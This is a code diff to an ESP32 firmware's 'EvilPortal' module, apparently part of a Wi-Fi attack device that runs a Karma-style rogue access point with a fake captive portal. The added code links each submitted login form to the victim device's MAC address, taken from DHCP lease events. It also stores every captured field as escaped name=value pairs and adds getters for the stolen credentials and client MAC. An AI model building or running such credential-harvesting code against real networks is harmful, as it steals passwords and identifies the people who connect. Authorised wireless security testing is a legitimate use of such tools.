@@ -14,6 +14,76 @@ static DNSServer &sharedEvilPortalDnsServer() {
     return server;
 }
 
+// ESPAsyncWebServer only exposes the peer's IP address, so the MAC of the
+// client that filled in the form has to be recovered from the softAP's DHCP
+// leases: IP_EVENT_AP_STAIPASSIGNED carries both halves of the pair. The table
+// is tiny and overwrites the oldest entry, which is enough for a Karma portal
+// that serves a handful of clients per ESSID.
+namespace {
+
+struct ApClientLease {
+    uint32_t ip;
+    uint8_t mac[6];
+};
+
+constexpr size_t AP_CLIENT_LEASE_SLOTS = 8;
+ApClientLease apClientLeases[AP_CLIENT_LEASE_SLOTS] = {};
+size_t apClientLeaseNext = 0;
+
+void recordApClientLease(uint32_t ip, const uint8_t *mac) {
+    for (size_t i = 0; i < AP_CLIENT_LEASE_SLOTS; i++) {
+        if (apClientLeases[i].ip == ip) {
+            memcpy(apClientLeases[i].mac, mac, 6);
+            return;
+        }
+    }
+    apClientLeases[apClientLeaseNext].ip = ip;
+    memcpy(apClientLeases[apClientLeaseNext].mac, mac, 6);
+    apClientLeaseNext = (apClientLeaseNext + 1) % AP_CLIENT_LEASE_SLOTS;
+}
+
+String lookupApClientMac(uint32_t ip) {
+    for (size_t i = 0; i < AP_CLIENT_LEASE_SLOTS; i++) {
+        if (apClientLeases[i].ip != ip) continue;
+        const uint8_t *m = apClientLeases[i].mac;
+        char buf[18];
+        snprintf(buf, sizeof(buf), "%02X:%02X:%02X:%02X:%02X:%02X", m[0], m[1], m[2], m[3], m[4], m[5]);
+        return String(buf);
+    }
+    return "unknown";
+}
+
+void ensureApClientLeaseTracking() {
+    static bool registered = false;
+    if (registered) return;
+    registered = true;
+    WiFi.onEvent(
+        [](arduino_event_id_t, arduino_event_info_t info) {
+            recordApClientLease(info.wifi_ap_staipassigned.ip.addr, info.wifi_ap_staipassigned.mac);
+        },
+        ARDUINO_EVENT_WIFI_AP_STAIPASSIGNED
+    );
+}
+
+// Values land inside a quoted "name=value,name=value" field, so anything that
+// would break that framing is escaped rather than dropped.
+String escapeCapturedValue(const String &value) {
+    String out;
+    out.reserve(value.length());
+    for (size_t i = 0; i < value.length(); i++) {
+        char c = value[i];
+        if (c == '"' || c == '\\') out += '\\';
+        if (c == '\r' || c == '\n') {
+            out += ' ';
+            continue;
+        }
+        out += c;
+    }
+    return out;
+}
+
+} // namespace
+
 EvilPortal::EvilPortal(
     String tssid, uint8_t channel, bool deauth, bool verifyPwd, bool autoMode, bool backgroundMode,
     String templateFile
@@ -130,6 +200,7 @@ bool EvilPortal::setup() {
 }
 
 void EvilPortal::beginAP() {
+    ensureApClientLeaseTracking();
     if (!_backgroundMode) {
         drawMainBorderWithTitle("EVIL PORTAL");
         displayTextLine("Starting...");
@@ -393,6 +464,10 @@ void EvilPortal::processRequests() {
 bool EvilPortal::hasCredentials() { return totalCapturedCredentials > 0; }
 
 String EvilPortal::getCapturedPassword() { return lastCred; }
+
+String EvilPortal::getCapturedData() { return lastCredData; }
+
+String EvilPortal::getCapturedClientMac() { return lastClientMac; }
 
 String EvilPortal::getCapturedSSID() { return apName; }
 
@@ -684,6 +759,8 @@ void EvilPortal::credsController(AsyncWebServerRequest *request) {
     String csvLine = "";
     String key;
     lastCred = "";
+    lastCredData = "";
+    lastClientMac = lookupApClientMac((uint32_t)request->client()->remoteIP());
 
     for (int i = 0; i < request->args(); i++) {
         key = request->argName(i);
@@ -716,6 +793,9 @@ void EvilPortal::credsController(AsyncWebServerRequest *request) {
 
         csvLine += key + ": " + valueBuffer;
         lastCred += key.substring(0, 3) + ": " + valueBuffer + "\n";
+
+        if (lastCredData.length() > 0) lastCredData += ",";
+        lastCredData += escapeCapturedValue(key) + "=" + escapeCapturedValue(valueBuffer);
     }
 
     htmlResponse += "</li>\n";
